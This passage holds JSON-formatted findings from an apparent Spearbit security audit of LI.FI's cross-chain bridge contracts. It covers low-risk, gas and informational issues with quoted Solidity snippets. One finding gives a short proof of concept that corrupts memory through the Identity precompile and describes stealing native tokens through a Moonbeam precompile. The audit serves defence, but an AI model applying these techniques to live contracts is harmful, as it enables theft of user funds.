) ... { ... // do actions emit LiFiTransferStarted( _lifiData.transactionId, \"omni\", \"\", _lifiData.integrator, _lifiData.referrer, _lifiData.sendingAssetId, _lifiData.receivingAssetId, _lifiData.receiver, _lifiData.amount, _lifiData.destinationChainId, _hasSourceSwap, false ); }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Missing emit in XChainExecFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The function swapAndCompleteBridgeTokens of Executor does do an emit LiFiTransferCom- pleted , while the comparable function in XChainExecFacet doesnt do this emit. This way there will be missing emits. contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function swapAndCompleteBridgeTokens(LiFiData calldata _lifiData, ... ) ... { ... emit LiFiTransferCompleted( ... ); } } contract XChainExecFacet is SwapperV2, ReentrancyGuard { function swapAndCompleteBridgeTokens(LiFiData calldata _lifiData, ... ) ... { ... // no emit } }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Different access control to withdraw funds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "To withdraw any stuck tokens, WithdrawFacet.sol provides two functions: executeCallAndWith- draw() and withdraw(). Both have different access controls on them.  executeCallAndWithdraw() can be called by the owner or if msg.sender has been approved to call a function whose signature matches that of executeCallAndWithdraw().  withdraw() can only be called by the owner. If the function signature of executeCallAndWithdraw() clashes with an approved signature in execAccess map- ping, the approved address can steal all the funds in LifiDiamond contract.", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Use internal where possible", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Several functions have an access control where the msg.sender if compared to address(this), which means it can only be called from the same contract. In the current code with the various generic call mechanisms this isnt a safe check. For example the function _execute() from Executor.sol can circumvent this check. Luckily the function where this has been used have a low risk profile so the risk of this issue is limited. function swapAndCompleteBridgeTokensViaStargate(...) ... { if (msg.sender != address(this)) { revert InvalidCaller(); } ... }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Event of transfer is not emitted in the AxelarFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The usage of the LiFi protocol depends largely to the off chain APIs. It takes all values, fees, limits, chain ids and addresses to be called from the APIs. The events are useful to record these changes on-chain for off-chain monitors/tools/interfaces when integrating with off-chain APIs. Although, other facets are emitting LiFiTransferStarted event, AxelarFacet does not emit this event. contract AxelarFacet { function executeCallViaAxelar(...) ... {} function executeCallWithTokenViaAxelar(...) ... {} } On the receiving side, the Executor contract does do an emit in function _execute() but not in function _- executeWithToken(). contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function _execute(...) ... { ... emit AxelarExecutionComplete(callTo, bytes4(callData)); } function _executeWithToken( ... // no emit } }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Improve checks on the facets", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "In the facets, receiver/destination address and amount checks are missing.  The symbol parameter is used to get address of token with gateways tokenAddresses function. tokenAd- dresses function get token address by mapping. If the symbol does not exist, the token address can be zero. AxelarFacet and Executor do not check If the given symbol exists or not. 36 contract AxelarFacet { function executeCallWithTokenViaAxelar(...) ... { address tokenAddress = s.gateway.tokenAddresses(symbol); } function initAxelar(address _gateway, address _gasReceiver) external { s.gateway = IAxelarGateway(_gateway); s.gasReceiver = IAxelarGasService(_gasReceiver); } } contract Executor { function _executeWithToken(...) ... { address tokenAddress = s.gateway.tokenAddresses(symbol); } }  GnosisBridgeFacet, CBridgeFacet, HopFacet and HyphenFacets are missing receiver address/amount check. contract CBridgeFacet { function _startBridge(...) ... { ... _cBridgeData.receiver ... } } contract GnosisBridgeFacet { function _startBridge(...) ... { ... gnosisBridgeData.receiver ... } } contract HopFacet { function _startBridge(...) ... { _hopData.recipient, ... ... } } contract HyphenFacet { function _startBridge(...) ... { _hyphenData.recipient ... ... } }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Use keccak256() instead of hex", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Several NAMESPACEs are defined, some with a hex value and some with a keccak256(). To be able to verify they are all different it is better to use the same format everywhere. If they would use the same value then the variables stored on that location could interfere with each other and the LiFi Diamond could start to behave unreliably. ... NAMESPACE = hex\"c7...\"; // keccak256(\"com.lifi.facets.axelar\") ... NAMESPACE = hex\"cf...\"; // keccak256(\"com.lifi.facets.ownership\"); ... NAMESPACE = hex\"a6...\"; ReentrancyGuard.sol: AxelarFacet.sol: OwnershipFacet.sol: PeripheryRegistryFacet.sol: ... NAMESPACE = hex\"dd...\"; // keccak256(\"com.lifi.facets.periphery_registry\"); ,! StargateFacet.sol: LibAccess.sol: ,! LibDiamond.sol: keccak256(\"com.lifi.library.access.management\") ... NAMESPACE = keccak256(\"com.lifi.facets.stargate\"); ... ACCESS_MANAGEMENT_POSITION = hex\"df...\"; // ... DIAMOND_STORAGE_POSITION = keccak256(\"diamond.standard.diamond.storage\");", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Remove redundant Swapper.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "There are two versions of Swapper.sol (e.g Swapper.sol and SwapperV2.sol ) which are function- ally more or less the same. The WormholeFacet contract is the only one still using Swapper.sol. Having two versions of the same code is confusing and difficult to maintain. import { Swapper } from \"../Helpers/Swapper.sol\"; contract WormholeFacet is ILiFi, ReentrancyGuard, Swapper { }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Use additional checks for transferFrom()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Several functions transfer tokens via transferFrom() without checking the return code. Some of the contracts are not covering edge cases like non-standard ERC20 tokens that do not:  revert on failed transfers.  Some ERC20 implementations dont revert is the balance is insufficient but return false. Other functions transfer tokens with checking if the amount of tokens received is equal to the amount of tokens requested. This relevant for tokens that withhold a fee. Luckily there is always additional code, like bridge, dex or pool code, that verifies the amount of tokens received, so the risk is limited. contract AxelarFacet { function executeCallWithTokenViaAxelar(... ) ... { ... IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount); // no check on return ,! code & amount of tokens ... } } contract ERC20Proxy is Ownable { function transferFrom(...) ... { ... IERC20(tokenAddress).transferFrom(from, to, amount); // no check on return code & amount of ,! tokens ... } } contract FusePoolZap { function zapIn(...) ... { ... IERC20(_supplyToken).transferFrom(msg.sender, address(this), _amount); // no check on amount of tokens ,! return code & } } library LibSwap { function swap(...) ... { ... LibAsset.transferFromERC20(fromAssetId, msg.sender, address(this), toDeposit); // no check on amount of tokens } ,! }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Move code to check amount of tokens transferred to library", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Facet.sol,OptimismBridgeFacet.sol, PolygonBridgeFacet.sol and StargateFacet.sol, to verify all required tokens are indeed transferred. The following piece of code is present However it doesnt check msg.value == _bridgeData.amount in case a native token is used. The more generic depositAsset() of LibAsset.sol does have this check. uint256 _fromTokenBalance = LibAsset.getOwnBalance(_bridgeData.assetId); LibAsset.transferFromERC20(_bridgeData.assetId, msg.sender, address(this), _bridgeData.amount); if (LibAsset.getOwnBalance(_bridgeData.assetId) - _fromTokenBalance != _bridgeData.amount) { revert InvalidAmount(); }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Fuse pools are not whitelisted", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Rari Fuse is a permissionless framework for creating and running user-created open interest rate pools with customizable parameters. On the FusePoolZap contract, the correctness of pool is not checked. Be- cause of Fuse is permissionless framework, an attacker can create a fake pool, through this contract a user can be be tricked in the malicious pool. function zapIn( address _pool, address _supplyToken, uint256 _amount ) external {}", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Missing two-step transfer ownership pattern", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Executor contract used for arbitrary cross-chain and same chain execution, swaps and transfers. The Executor contract uses Ownable from OpenZeppelin which is a simple mechanism to transfer the ownership not supporting a two-steps transfer ownership pattern. OpenZeppelin describes Ownable as: Ownable is a simpler mechanism with a single owner \"role\" that can be assigned to a single account. This simpler mechanism can be useful for quick tests but projects with production concerns are likely to outgrow it. Transferring ownership is a critical operation and transferring it to an inaccessible wallet or renouncing the owner- ship e.g. by mistake, can effectively lost functionality.", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Use low-level call only on contract addresses", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "In the following case, if callTo is an EOA, success will be true. (bool success, ) = callTo.call(callData); The user intention here will be to do a smart contract call. So if there is no code deployed at callTo, the execution should be reverted. Otherwise, users can be under a wrong assumption that their cross-chain call was successful.", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Functions which do not expect ether should be non-payable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "A function which doesnt expect ether should not be marked payable. swapAndStartBridgeTo- kensViaAmarok() is a payable function, however it reverts when called for the native asset: if (_bridgeData.assetId == address(0)) { revert TokenAddressIsZero(); } So in the case where _bridgeData.assetId != address(0), any ether sent as msg.value is locked in the con- tract.", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Incompatible contract used in the WormholeFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "During the code review, It has been observed that all other faucets are using SwapperV2 contract. However, the WormholeFacet is still using Swapper contract. With the recent change on the SwapperV2, leftOvers can be send to specific receiver. With the using old contract, this capability will be lost in the related faucet. Also, LiFi Team claims that Swapper contract will be deprecated. ... import { Swapper } from \"../Helpers/Swapper.sol\"; /// @title Wormhole Facet /// @author [LI.FI](https://li.fi) /// @notice Provides functionality for bridging through Wormhole contract WormholeFacet is ILiFi, ReentrancyGuard, Swapper { ...", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Solidity version bump to latest", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "During the review the newest version of solidity was released with the important bug fixes & Bug.", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Bridge with AmarokFacet can fail due to hardcoded variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "During the code review, It has been observed that callbackFee and relayerFee are set to 0. However, Connext mentioned that Its set to 0 on the testnet. On the mainnet, these variables can be edited by Connext and AmarokFacet bridge operations can fail. ... IConnextHandler.XCallArgs memory xcallArgs = IConnextHandler.XCallArgs({ params: IConnextHandler.CallParams({ to: _bridgeData.receiver, callData: _bridgeData.callData, originDomain: _bridgeData.srcChainDomain, destinationDomain: _bridgeData.dstChainDomain, agent: _bridgeData.receiver, recovery: msg.sender, forceSlow: false, receiveLocal: false, callback: address(0), callbackFee: 0, // fee paid to relayers; relayers don't take any fees on testnet relayerFee: 0, // fee paid to relayers; relayers don't take any fees on testnet slippageTol: _bridgeData.slippageTol }), transactingAssetId: _bridgeData.assetId, amount: _amount }); ...", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Store _dexs[i] into a temp variable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The DexManagerFacet can store _dexs[i] into a temporary variable to save some gas. function batchAddDex(address[] calldata _dexs) external { if (msg.sender != LibDiamond.contractOwner()) { LibAccess.enforceAccessControl(); } mapping(address => bool) storage dexAllowlist = appStorage.dexAllowlist; uint256 length = _dexs.length; for (uint256 i = 0; i < length; i++) { _checkAddress(_dexs[i]); if (dexAllowlist[_dexs[i]]) continue; dexAllowlist[_dexs[i]] = true; appStorage.dexs.push(_dexs[i]); emit DexAdded(_dexs[i]); } } 43", "labels": ["Spearbit", "LIFI", "Severity: Gas Optimization"]}, {"title": "Optimize array length in for loop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "In a for loop the length of an array can be put in a temporary variable to save some gas. This has been done already in several other locations in the code. function swapAndStartBridgeTokensViaStargate(...) ... { ... for (uint8 i = 0; i < _swapData.length; i++) { ... } ... }", "labels": ["Spearbit", "LIFI", "Severity: Gas Optimization"]}, {"title": "StargateFacet can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "It might be cheaper to call getTokenFromPoolId in a constructor and store in immutable variables (especially because there are not that many pool, currently max 3 per chain pool-ids ) On the other hand, It requires an update of the facet when new pools are added though. function getTokenFromPoolId(address _router, uint256 _poolId) private view returns (address) { address factory = IStargateRouter(_router).factory(); address pool = IFactory(factory).getPool(_poolId); return IPool(pool).token(); } For the srcPoolId it would be possible to replace this with a token address in the calling interface and lookup the poolid. However, for dstPoolId this would be more difficult, unless you restrict it to the case where srcPoolId == dstPoolId e.g. the same asset is received on the destination chain. This seems a logical restriction. The advantage of not having to specify the poolids is that you abstract the interface from the caller and make the function calls more similar.", "labels": ["Spearbit", "LIFI", "Severity: Gas Optimization"]}, {"title": "Use block.chainid for chain ID verification in HopFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "HopFacet.sol uses user provided _hopData.fromChainId to identify current chain ID. Call to Hop Bridge will revert if it does not match block.chain, so this is still secure. However, as a gas optimization, this parameter can be removed from HopData struct, and its usage can be replaced by block.chainid.", "labels": ["Spearbit", "LIFI", "Severity: Gas Optimization"]}, {"title": "Rename event InvalidAmount(uint256) to ZeroAmount()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "event InvalidAmount(uint256) is emitted only with an argument of 0: if (_amount <= 0) { revert InvalidAmount(_amount); } ... if (msg.value <= 0) { revert InvalidAmount(msg.value); } Since amount and msg.value can only be non-negative, these if conditions succeed only when these values are 0. Hence, only InvalidAmount(0) is ever emitted.", "labels": ["Spearbit", "LIFI", "Severity: Gas Optimization"]}, {"title": "Use custom errors instead of strings", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "To save some gas the use of custom errors leads to cheaper deploy time cost and run time cost. The run time cost is only relevant when the revert condition is met.", "labels": ["Spearbit", "LIFI", "Severity: Gas Optimization LibDiamond.sol#L56,"]}, {"title": "Use calldata over memory", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "When a function with a memory array is called externally, the abi.decode() step has to use a for-loop to copy each index of the calldata to the memory index. Each iteration of this for-loop costs at least 60 gas (i.e. 60 * <mem_array>.length). Using calldata directly, obliviates the need for such a loop in the contract code and runtime execution. If the array is passed to an internal function which passes the array to another internal function where the array is modified and therefore memory is used in the external call, its still more gass-efficient to use calldata when the external function uses modifiers, since the modifiers may prevent the internal functions from being called. Some gas savings if function arguments are passed as calldata instead of memory.", "labels": ["Spearbit", "LIFI", "Severity: Gas Optimization"]}, {"title": "Avoid reading from storage when possible", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Functions, which can only be called by the contracts owner, can use msg.sender to read owners In all these cases below, ownership check is already done, so it is address after the ownership check is done. guaranteed that owner == msg.sender. LibAsset.transferAsset(tokenAddress, payable(owner), balance); ... LibAsset.transferAsset(tokenAddresses[i], payable(owner), balance); ... if (_newOwner == owner) revert NewOwnerMustNotBeSelf(); owner is a state variable, so reading it has significant gas costs. This can be avoided here by using msg.sender instead.", "labels": ["Spearbit", "LIFI", "Severity: Gas Optimization"]}, {"title": "Increment for loop variable in an unchecked block", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "(This is only relevant if you are using the default solidity checked arithmetic). i++ involves checked arithmetic, which is not required. This is because the value of i is always strictly less than length <= 2**256 - 1. Therefore, the theoretical maximum value of i to enter the for-loop body is 2**256 - 2. This means that the i++ in the for loop can never overflow. Regardless, the overflow checks are performed by the compiler. Unfortunately, the Solidity optimizer is not smart enough to detect this and remove the checks. One can manually do this by: for (uint i = 0; i < length; ) { // do something that doesn't change the value of i unchecked { ++i; } }", "labels": ["Spearbit", "LIFI", "Severity: Gas Optimization"]}, {"title": "Executor should consider pre-deployed contract behaviors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Executor contract allows users to do arbitrary calls. This allows users to trigger pre-deployed contracts (which are used on specific chains). Since the behaviors of pre-deployed contracts differ, dapps on different evm compatible chain would have different security assumption. Please refer to the Avax bug fix. Native-asset-call-deprecation Were the native asset call not deprecated, exploiters can bypass the check and triggers ERC20Proxy through the pre-deployed contract. Since the Avalanche team has deprecated the dangerous pre-deployed, the current Executor contract is not vulnerable. Moonbeams pre-deployed contract also has strange behaviors. Precompiles erc20 allows users transfer native token through ERC20 interface. Users can steal native tokens on the Executor by setting callTo = address(802) and calldata = transfer(receiver, amount) One of the standard ethereum mainnet precompiles is \"Identity\" (0x4), which copies memory. Depending on the use of memory variables of the function that does the callTo, it can corrupt memory. Here is a POC: 47 pragma solidity ^0.8.17; import \"hardhat/console.sol\"; contract Identity { function CorruptMem() public { uint dest = 128; uint data = dest + 1 ; uint len = 4; assembly { if iszero(call(gas(), 0x04, 0, add(data, 0x20), len, add(dest,0x20), len)) { invalid() } } } constructor() { string memory a = \"Test!\"; CorruptMem(); console.log(string(a)); // --> est!! } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Documentation improvements", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "There are a few issues in the documentation:  HyphenFacets documentation describes a function no longer present.  Link to DexManagerFacet in README.md is incorrect.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Check quoteTimestamp is within ten minutes", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "quoteTimestamp is not validated. According to Across, quoteTimestamp variable, at which the depositor will be quoted for L1 liquidity. This enables the depositor to know the L1 fees before submitting their deposit. Must be within 10 mins of the current time. function _startBridge(AcrossData memory _acrossData) internal { bool isNative = _acrossData.token == ZERO_ADDRESS; if (isNative) _acrossData.token = _acrossData.weth; else LibAsset.maxApproveERC20(IERC20(_acrossData.token), _acrossData.spokePool, ,! _acrossData.amount); IAcrossSpokePool pool = IAcrossSpokePool(_acrossData.spokePool); pool.deposit{ value: isNative ? _acrossData.amount : 0 }( _acrossData.recipient, _acrossData.token, _acrossData.amount, _acrossData.destinationChainId, _acrossData.relayerFeePct, _acrossData.quoteTimestamp ); }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Integrate two versions of depositAsset()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The function depositAsset(, , isNative ) doesnt check tokenId == NATIVE_ASSETID, although depositAsset(,) does. In the code base depositAsset(, , isNative ) isnt used. function depositAsset( address tokenId, uint256 amount, bool isNative ) internal { if (amount == 0) revert InvalidAmount(); if (isNative) { ... } else { ... } } function depositAsset(address tokenId, uint256 amount) internal { return depositAsset(tokenId, amount, tokenId == NATIVE_ASSETID); }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Simplify batchRemoveDex()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The code of batchRemoveDex() is somewhat difficult to understand and thus to maintain. function batchRemoveDex(address[] calldata _dexs) external { ... uint256 jlength = storageDexes.length; for (uint256 i = 0; i < ilength; i++) { ... for (uint256 j = 0; j < jlength; j++) { if (storageDexes[j] == _dexs[i]) { ... // update storageDexes.length; jlength = storageDexes.length; break; } } } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Error handing in executeCallAndWithdraw", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "If isContract happens to be false then success is false (as it is initialized as false and not updated) Thus the _withdrawAsset() will never happen. Function withdraw() also exist so this functionality isnt necessary but its more logical to revert earlier. 50 function executeCallAndWithdraw(...) ... { ... bool success; bool isContract = LibAsset.isContract(_callTo); if (isContract) { false // thus is false ,! (success, ) = _callTo.call(_callData); } if (success) { // if this is false, then success stays _withdrawAsset(_assetAddress, _to, _amount); // this never happens if isContract == false } else { revert WithdrawFailed(); } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "_withdrawAsset() could use LibAsset.transferAsset()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "A large part of the function _withdrawAsset() is very similar to LibAsset.transferAsset(). function _withdrawAsset(...) ... { ... if (_assetAddress == NATIVE_ASSET) { address self = address(this); if (_amount > self.balance) revert NotEnoughBalance(_amount, self.balance); (bool success, ) = payable(sendTo).call{ value: _amount }(\"\"); if (!success) revert WithdrawFailed(); } else { assetBalance = IERC20(_assetAddress).balanceOf(address(this)); if (_amount > assetBalance) revert NotEnoughBalance(_amount, assetBalance); SafeERC20.safeTransfer(IERC20(_assetAddress), sendTo, _amount); } ... }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "anySwapOut() doesnt lower allowance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The function anySwapOut() only seems to work with Anyswap tokens. It burns the received to- kens here: AnyswapV5Router.sol#L334 This burning doesnt use/lower the allowance, so the allowance will stay present. Also see howto: function anySwapOut ==> no need to approve. function _startBridge(...) ... { ... LibAsset.maxApproveERC20(IERC20(underlyingToken), _anyswapData.router, _anyswapData.amount); ... IAnyswapRouter(_anyswapData.router).anySwapOut(...); }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Anyswap rebrand", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Anyswap is rebranded to Multichain see rebrand.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Check processing of native tokens in AnyswapFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The variable isNative seems to mean a wrapped native token is used (see function _getUnderly- ingToken() ). Currently startBridgeTokensViaAnyswap() skips LibAsset.depositAsset() when isNative == true, but a wrapped native tokens should also be moved via LibAsset.depositAsset(). Also _startBridge() tries to send native tokens with { value: _anyswapData.amount } then isNative == true, but this wouldnt work with wrapped tokens. The Howto seems to indicate an approval (of the wrapped native token) is neccesary. 52 contract AnyswapFacet is ILiFi, SwapperV2, ReentrancyGuard { ,! ,! function startBridgeTokensViaAnyswap(LiFiData calldata _lifiData, AnyswapData calldata _anyswapData) ... { { // Multichain (formerly Anyswap) tokens can wrap other tokens (address underlyingToken, bool isNative) = _getUnderlyingToken(_anyswapData.token, _anyswapData.router); if (!isNative) LibAsset.depositAsset(underlyingToken, _anyswapData.amount); ... } function _getUnderlyingToken(address token, address router) ... { ... if (token == address(0)) revert TokenAddressIsZero(); underlyingToken = IAnyswapToken(token).underlying(); // The native token does not use the standard null address ID isNative = IAnyswapRouter(router).wNATIVE() == underlyingToken; // Some Multichain complying tokens may wrap nothing if (!isNative && underlyingToken == address(0)) { underlyingToken = token; } } function _startBridge(... ) ... { ... if (isNative) { IAnyswapRouter(_anyswapData.router).anySwapOutNative{ value: _anyswapData.amount }(...); // ,! send native tokens } ... } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Remove payable in swapAndCompleteBridgeTokensViaStargate()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "There are 2 versions of sgReceive() / completeBridgeTokensViaStargate() which use different locations for nonReentrant The function swapAndCompleteBridgeTokensViaStargate of Executor is payable but doesnt receive native to- kens. 53 contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function sgReceive(...) external { // not payable ... this.swapAndCompleteBridgeTokensViaStargate(lifiData, swapData, assetId, payable(receiver)); // ,! doesn't send native assets ... } function swapAndCompleteBridgeTokensViaStargate(...) external payable nonReentrant { // is payable if (msg.sender != address(this)) { revert InvalidCaller(); } } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Use the same order for inherited contracts.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The inheritance of contract isnt always done in the same order. For code consistency its best to always put them in the same order. contract AmarokFacet contract AnyswapFacet contract ArbitrumBridgeFacet contract CBridgeFacet contract GenericSwapFacet contract GnosisBridgeFacet contract HopFacet contract HyphenFacet contract NXTPFacet contract OmniBridgeFacet contract OptimismBridgeFacet contract PolygonBridgeFacet contract StargateFacet contract GenericBridgeFacet contract WormholeFacet contract AcrossFacet contract Executor is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, ReentrancyGuard { is ILiFi, ReentrancyGuard, Swapper { is ILiFi, ReentrancyGuard, SwapperV2 { is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi {", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Catch potential revert in swapAndStartBridgeTokensViaStargate()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The following statement nativeFee -= _swapData[i].fromAmount; can revert in the swapAnd- StartBridgeTokensViaStargate(). function swapAndStartBridgeTokensViaStargate(...) ... { ... for (uint8 i = 0; i < _swapData.length; i++) { if (LibAsset.isNativeAsset(_swapData[i].sendingAssetId)) { nativeFee -= _swapData[i].fromAmount; // can revert } } ... }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "No need to use library If It is in the same file", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "On the LibAsset, some of the functions are called through LibAsset., however there is no need to call because the functions are in the same solidity file. ... ... if (msg.value != 0) revert NativeValueWithERC(); uint256 _fromTokenBalance = LibAsset.getOwnBalance(tokenId); LibAsset.transferFromERC20(tokenId, msg.sender, address(this), amount); if (LibAsset.getOwnBalance(tokenId) - _fromTokenBalance != amount) revert InvalidAmount();", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Combined Optimism and Synthetix bridge", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The Optimism bridge also includes a specific bridge for Synthetix tokens. Perhaps it is more clear to have a seperate Facet for this. function _startBridge(...) ... { ... if (_bridgeData.isSynthetix) { bridge.depositTo(_bridgeData.receiver, _amount); } else { ... } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Doublecheck the Diamond pattern", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The LiFi protocol uses the diamond pattern. This pattern is relative complex and has overhead for the delegatecall. There is not much synergy between the different bridges (except for access controls & white lists). By combining all the bridges in one contract, the risk of one bridge might have an influence on another bridge.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Reference Diamond standard", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The LiFiDiamond.sol contract doesnt contain a reference to the Diamond contract. Having that would make it easier for readers of the code to find the origin of the contract.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Validate Nxtp InvariantTransactionData", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "During the code review, It has been noticed that InvariantTransactionDatas fields are not validated. Even if the validation located in the router, sendingChainFallback and receivingAddress parameters are sensible and connext does not have meaningful error message on these parameter validation. Also, router parameter does not have any validation. Most of the other facets have. For instance : Amarok Facet Note: also see issue \"Hardcode bridge addresses via immutable\" function _startBridge(NXTPData memory _nxtpData) private returns (bytes32) { ITransactionManager txManager = ITransactionManager(_nxtpData.nxtpTxManager); IERC20 sendingAssetId = IERC20(_nxtpData.invariantData.sendingAssetId); // Give Connext approval to bridge tokens LibAsset.maxApproveERC20(IERC20(sendingAssetId), _nxtpData.nxtpTxManager, _nxtpData.amount); uint256 value = LibAsset.isNativeAsset(address(sendingAssetId)) ? 